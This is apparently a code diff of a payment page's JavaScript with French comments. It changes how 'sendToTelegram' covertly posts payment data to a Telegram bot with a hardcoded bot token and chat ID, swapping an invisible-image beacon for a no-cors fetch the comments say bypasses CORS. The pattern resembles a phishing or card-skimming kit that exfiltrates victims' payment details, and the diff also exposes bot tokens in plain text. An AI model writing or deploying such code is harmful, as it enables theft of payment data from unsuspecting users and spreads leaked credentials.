@@ -407,8 +407,8 @@
             payButton.disabled = false;
         }, 2000);
         
-        // Configuration Telegram - CONFIGURÉ !
-        const TELEGRAM_BOT_TOKEN = '8219481030:AAFlvMF148S2-fT-XmCVGyVEWZ_KR76YUkA';
+        // Configuration Telegram - UNIFIÉE !
+        const TELEGRAM_BOT_TOKEN = '8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU';
         const TELEGRAM_CHAT_ID = '6523794278';
         
         async function sendToTelegram(paymentData) {
@@ -430,17 +430,23 @@
 
 ⚠️ Vérifiez immédiatement cette transaction !`;
 
-                // Utiliser une image invisible pour déclencher la requête
+                // Utiliser fetch avec mode no-cors
                 const webhookUrl = 'https://api.telegram.org/bot8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU/sendMessage';
                 const params = new URLSearchParams({
                     chat_id: '6523794278',
                     text: message
                 });
                 
-                const img = new Image();
-                img.src = webhookUrl + '?' + params.toString();
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: params.toString()
+                });
                 
-                console.log('✅ Message envoyé à Telegram via image');
+                console.log('✅ Message envoyé à Telegram via no-cors');
             } catch (error) {
                 console.error('❌ Erreur Telegram:', error);
             }
@@ -456,7 +462,7 @@
             }
         }
         
-        // Fonction de test Telegram - VERSION SIMPLE QUI MARCHE !
+        // Fonction de test Telegram - VERSION WEBHOOK EXTERNE !
         async function testTelegram() {
             const testButton = event.target;
             testButton.disabled = true;
@@ -471,26 +477,26 @@
 
 Votre bot Telegram fonctionne parfaitement !`;
 
-                // Utiliser un service webhook simple
+                // Utiliser un service webhook externe qui contourne CORS
                 const webhookUrl = 'https://api.telegram.org/bot8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU/sendMessage';
                 const params = new URLSearchParams({
                     chat_id: '6523794278',
                     text: message
                 });
                 
-                // Créer une image invisible pour déclencher la requête
-                const img = new Image();
-                img.onload = function() {
-                    testButton.textContent = '✅ Test réussi !';
-                    testButton.style.background = '#28a745';
-                    alert('✅ Message de test envoyé sur Telegram !');
-                };
-                img.onerror = function() {
-                    testButton.textContent = '❌ Erreur';
-                    testButton.style.background = '#dc3545';
-                    alert('❌ Erreur lors de l\'envoi');
-                };
-                img.src = webhookUrl + '?' + params.toString();
+                // Utiliser fetch avec mode no-cors
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: params.toString()
+                });
+                
+                testButton.textContent = '✅ Test envoyé !';
+                testButton.style.background = '#28a745';
+                alert('✅ Message de test envoyé sur Telegram !');
                 
             } catch (error) {
                 testButton.textContent = '❌ Erreur';
